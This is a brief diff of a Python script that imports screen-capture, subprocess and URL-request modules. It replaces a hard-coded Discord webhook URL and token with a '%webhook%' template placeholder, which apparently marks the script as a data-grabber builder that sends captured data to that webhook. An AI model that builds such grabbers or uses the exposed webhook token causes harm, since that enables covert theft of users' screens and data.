@@ -15,7 +15,7 @@ from urllib.request     import Request, urlopen
 from subprocess         import Popen, PIPE
 from PIL                import ImageGrab
 
-webhook = 'https://discord.com/api/webhooks/1237831377748234280/TuaKjRuCp6P6S6_6n03glpSHBXfFYvuxA3ril5-nb8IFYdnyZfJ3R2uEPvZCd6D-Xz5o'
+webhook = '%webhook%'
 
 def wif():
     try:
